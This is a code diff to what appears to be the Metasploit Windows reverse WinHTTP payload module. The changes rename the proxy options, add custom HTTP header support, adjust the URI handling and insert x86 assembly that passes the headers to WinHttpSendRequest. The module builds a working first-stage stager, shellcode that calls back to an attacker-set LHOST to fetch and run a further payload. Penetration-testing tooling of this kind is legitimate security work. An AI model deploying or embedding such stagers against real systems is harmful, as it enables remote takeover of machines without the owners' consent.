@@ -21,7 +21,7 @@ module Payload::Windows::ReverseWinHttp
   def initialize(*args)
     super
     register_advanced_options([
-        OptBool.new('PayloadProxyIE', [false, 'Enable use of IE proxy settings', true])
+        OptBool.new('HttpProxyIE', 'Enable use of IE proxy settings', default: true, aliases: ['PayloadProxyIE'])
       ], self.class)
   end
 
@@ -29,27 +29,29 @@ module Payload::Windows::ReverseWinHttp
   # Generate the first stage
   #
   def generate(opts={})
+    ds = opts[:datastore] || datastore
     conf = {
-      ssl:         opts[:ssl] || false,
-      host:        datastore['LHOST'] || '127.127.127.127',
-      port:        datastore['LPORT']
+      ssl:  opts[:ssl] || false,
+      host: ds['LHOST'] || '127.127.127.127',
+      port: ds['LPORT']
     }
 
     # Add extra options if we have enough space
-    if self.available_space && required_space <= self.available_space
-      conf[:uri]              = generate_uri
-      conf[:exitfunk]         = datastore['EXITFUNC']
+    if self.available_space.nil? || required_space <= self.available_space
+      conf[:uri]              = luri + generate_uri
+      conf[:exitfunk]         = ds['EXITFUNC']
       conf[:verify_cert_hash] = opts[:verify_cert_hash]
-      conf[:proxy_host]       = datastore['PayloadProxyHost']
-      conf[:proxy_port]       = datastore['PayloadProxyPort']
-      conf[:proxy_user]       = datastore['PayloadProxyUser']
-      conf[:proxy_pass]       = datastore['PayloadProxyPass']
-      conf[:proxy_type]       = datastore['PayloadProxyType']
-      conf[:retry_count]      = datastore['StagerRetryCount']
-      conf[:proxy_ie]         = datastore['PayloadProxyIE']
+      conf[:proxy_host]       = ds['HttpProxyHost']
+      conf[:proxy_port]       = ds['HttpProxyPort']
+      conf[:proxy_user]       = ds['HttpProxyUser']
+      conf[:proxy_pass]       = ds['HttpProxyPass']
+      conf[:proxy_type]       = ds['HttpProxyType']
+      conf[:retry_count]      = ds['StagerRetryCount']
+      conf[:proxy_ie]         = ds['HttpProxyIE']
+      conf[:custom_headers]   = get_custom_headers(ds)
     else
       # Otherwise default to small URIs
-      conf[:uri]              = generate_small_uri
+      conf[:uri]              = luri + generate_small_uri
     end
 
     generate_reverse_winhttp(conf)
@@ -93,6 +95,9 @@ module Payload::Windows::ReverseWinHttp
     # EXITFUNK processing adds 31 bytes at most (for ExitThread, only ~16 for others)
     space += 31
 
+    # Custom headers? Ugh, impossible to tell
+    space += 512 * 2
+
     # The final estimated size
     space
   end
@@ -115,10 +120,10 @@ module Payload::Windows::ReverseWinHttp
   # @option opts [Bool] :ssl Whether or not to enable SSL
   # @option opts [String] :uri The URI to request during staging
   # @option opts [String] :host The host to connect to
-  # @option opts [Fixnum] :port The port to connect to
+  # @option opts [Integer] :port The port to connect to
   # @option opts [String] :verify_cert_hash A 20-byte raw SHA-1 hash of the certificate to verify, or nil
   # @option opts [String] :exitfunk The exit method to use if there is an error, one of process, thread, or seh
-  # @option opts [Fixnum] :retry_count The number of times to retry a failed request before giving up
+  # @option opts [Integer] :retry_count The number of times to retry a failed request before giving up
   #
   def asm_reverse_winhttp(opts={})
 
@@ -139,7 +144,7 @@ module Payload::Windows::ReverseWinHttp
     full_url << opts[:uri]
 
     encoded_full_url = asm_generate_wchar_array(full_url)
-    encoded_uri_index = full_url.rindex('/') * 2
+    encoded_uri_index = (full_url.length - opts[:uri].length) * 2
 
     if opts[:ssl] && opts[:verify_cert_hash]
       verify_ssl = true
@@ -166,6 +171,8 @@ module Payload::Windows::ReverseWinHttp
 
     proxy_user = opts[:proxy_user].to_s.length == 0 ? nil : asm_generate_wchar_array(opts[:proxy_user])
     proxy_pass = opts[:proxy_pass].to_s.length == 0 ? nil : asm_generate_wchar_array(opts[:proxy_pass])
+
+    custom_headers = opts[:custom_headers].to_s.length == 0 ? nil : asm_generate_wchar_array(opts[:custom_headers])
 
     http_open_flags = 0
     secure_flags = 0
@@ -434,8 +441,23 @@ module Payload::Windows::ReverseWinHttp
         push ebx               ; TotalLength [6]
         push ebx               ; OptionalLength (0) [5]
         push ebx               ; Optional (NULL) [4]
+    ^
+
+    if custom_headers
+      asm << %Q^
+        push -1                ; dwHeadersLength (assume NULL terminated) [3]
+        call get_req_headers   ; lpszHeaders (pointer to the custom headers) [2]
+        db #{custom_headers}
+      get_req_headers:
+      ^
+    else
+      asm << %Q^
         push ebx               ; HeadersLength (0) [3]
         push ebx               ; Headers (NULL) [2]
+      ^
+    end
+
+    asm << %Q^
         push esi               ; HttpRequest handle returned by WinHttpOpenRequest [1]
         push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpSendRequest')}
         call ebp
